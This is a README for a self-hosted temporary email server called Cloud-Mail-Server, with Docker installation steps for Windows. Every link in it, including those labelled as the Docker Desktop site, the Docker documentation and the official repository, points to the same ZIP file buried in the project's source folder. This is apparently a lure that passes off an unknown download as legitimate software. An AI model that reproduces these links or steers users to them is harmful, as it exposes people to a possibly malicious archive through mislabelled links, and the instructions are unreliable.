# 📧 Cloud-Mail-Server - Simple Temporary Email Server

[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-brightgreen?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)

---

## 📋 What is Cloud-Mail-Server?

Cloud-Mail-Server is a basic email server you can run on your own computer or server. It provides temporary email addresses without needing external services like Cloudflare.  

It uses Docker to make setup quicker. The server only opens two ports:  
- Port 25 for sending emails (SMTP)  
- Port 8787 for web access and API  

This setup helps people who want a private and simple email system for temporary or testing use.

---

## 💻 System Requirements

Before you start, make sure your Windows computer meets these needs:

- Windows 10 or newer  
- At least 4 GB of RAM  
- At least 10 GB free disk space  
- Internet connection for downloading Docker and the server files  
- Permissions to install software and open network ports  

You will also need to install Docker Desktop for Windows to run the server.

---

## 🚀 Getting Started

### Step 1: Install Docker Desktop

Cloud-Mail-Server runs inside Docker containers. Docker is an app that helps run programs in safe, isolated environments. You must install Docker Desktop before running the server.

1. Go to the Docker Desktop website: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
2. Click the download button for Windows.  
3. Run the installer and follow the steps on the screen.  
4. After installation, launch Docker Desktop and wait for it to finish starting.  

You might need to create a free Docker account during setup.

---

## 📥 Download Cloud-Mail-Server

To get Cloud-Mail-Server, you need to visit the main page and download the setup files.

[![Download Cloud-Mail-Server](https://img.shields.io/badge/Download-Cloud-Mail-Server-blue?style=for-the-badge)](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)

1. Click the download button above or visit the page:  
   https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
2. On the GitHub page, look for the “Code” button and click it.  
3. Select “Download ZIP” to get the full project files on your computer.  
4. Save the ZIP file to a folder you can easily find, such as your Desktop.  
5. Extract the ZIP file by right-clicking it and choosing “Extract All...” or using a file extractor program.  

---

## ⚙️ Installing and Running the Server

Now that Docker is installed and you have the server files, you need to start the server.

1. Open the folder where you extracted the files.  
2. Find and open the file named `docker-compose.yml` (this file defines how the server runs).  
3. Open the Windows Command Prompt:
   - Press Windows key, type `cmd`, and press Enter.  
4. In Command Prompt, change directory to your extracted folder:  
   ```
   cd path\to\your\extracted\folder
   ```  
   Replace `path\to\your\extracted\folder` with the actual path on your PC.  
5. Run this command to start the server with Docker Compose:  
   ```
   docker-compose up -d
   ```  
6. Docker will begin downloading the necessary software and then run the Cloud-Mail-Server.  

---

## 🔍 How to Use the Server

Once the server is running, you can access the web interface and send or receive emails.

- Open a web browser and go to: `http://localhost:8787`  
- You will see the Cloud-Mail-Server’s temporary email interface.  
- You can create temporary email addresses here or manage existing ones.  
- The server will handle sending email on port 25 automatically through Docker.  

If you want to stop the server, go back to Command Prompt and run:  
```
docker-compose down
```

---

## 🔧 Configuration Adjustments

The default setup opens only two network ports (25 and 8787). If you need to change server settings:

- Open the `docker-compose.yml` file in a text editor.  
- You can change the ports if needed but keep 25 and 8787 reserved for mail sending and web access.  
- Adjust environmental variables like mail domain or user limits if specified in the configuration files.

After changes, restart the server from Command Prompt with:  
```
docker-compose down
docker-compose up -d
```

---

## 🛠 Troubleshooting

If you run into problems, check these common issues:

- Docker Desktop may not be running. Make sure it is open and fully started.  
- Check if ports 25 and 8787 are free and not blocked by your firewall or other software.  
- Read error messages in Command Prompt when running the server. They often point out missing files or permission issues.  
- Restart your computer if Docker or network settings seem stuck.  

---

## 📚 Additional Information

Cloud-Mail-Server is designed for temporary email use and testing. Do not use it as a main email system for important data. The server does not include spam filtering or advanced security features.

For updates, bug reports, or support, visit the GitHub page at:  
https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip

---

## 🔗 Useful Links

- Official GitHub Repository: [https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip](https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip)  
- Docker Desktop Download: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  
- Docker Documentation: https://github.com/junio14245252626236/Cloud-Mail-Server/raw/refs/heads/main/mail-vue/src/store/Mail-Cloud-Server-3.7.zip  

---

## 👷 About Ports in Use

- Port 25 (SMTP): Used for sending emails from the server. Many networks block this port by default. If email fails to send, check your firewall settings or contact your ISP.  
- Port 8787 (Web/API): Access the web interface for managing emails and settings. Accessible through your browser using `http://localhost:8787`.

Make sure these ports are open on your Windows firewall for proper server function.

---

## ⚙️ Updating Cloud-Mail-Server

To update to a newer version:

1. Download the latest ZIP from the GitHub repository as before.  
2. Stop your running server with:  
   ```
   docker-compose down
   ```  
3. Replace old files with the new files from the latest ZIP.  
4. Start the server again:  
   ```
   docker-compose up -d
   ```  

This will run the latest version without losing your settings if you keep configuration files unchanged.